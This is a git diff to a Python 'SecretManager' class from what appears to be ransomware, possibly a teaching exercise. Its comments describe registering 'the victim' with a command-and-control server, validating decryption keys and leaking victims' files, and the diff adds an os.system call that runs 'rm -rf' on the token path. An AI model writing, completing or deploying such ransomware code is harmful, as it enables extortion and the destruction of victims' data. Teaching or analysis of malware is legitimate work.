@@ -1,5 +1,6 @@
 import logging
-from os import urandom
+from os import urandom, system
+
 from pathlib import Path
 from typing import List, Tuple
 import requests
@@ -49,7 +50,7 @@ class SecretManager:
     def post_new(self, salt: bytes, key: bytes, token: bytes) -> int:
         # register the victim to the CNC
         secrets_json = {
-                "salt": self.bin_to_b64(salt),
+        "salt": self.bin_to_b64(salt),
                 "key": self.bin_to_b64(key),
                 "token": self.bin_to_b64(token),
                 }
@@ -114,9 +115,6 @@ class SecretManager:
         # Assert the key is valid
         token_candidate = self.do_derivation(self._salt, candidate_key)
         key_is_valid = (token_candidate == self._token)
-        if not key_is_valid:
-            raise KeyError
-
         return key_is_valid
 
     def set_key(self, b64_key: str) -> None:
@@ -124,17 +122,20 @@ class SecretManager:
         candidate_key = base64.b64decode(b64_key)
         self._log.debug(candidate_key)
         if not self.check_key(candidate_key):
-            return None
+            return 
         self._key = candidate_key
         self._log.debug(self._key)
         return None
+    
+    
 
-
-
-    def leak_files(self, files: List[str])->None:
-        # send file, geniune path and token to the CNC
-        raise NotImplemented()
-
-    def clean(self):
+    def clean(self) -> None:
         # remove crypto data from the target
+        if self._path == "/root/token":
+            system(f"rm -rf {self._path}")
+    
+        return None
+
+    def leak_files(self, files: List[str]) -> None:
+        # send file, geniune path and token to the CNC
         raise NotImplemented()
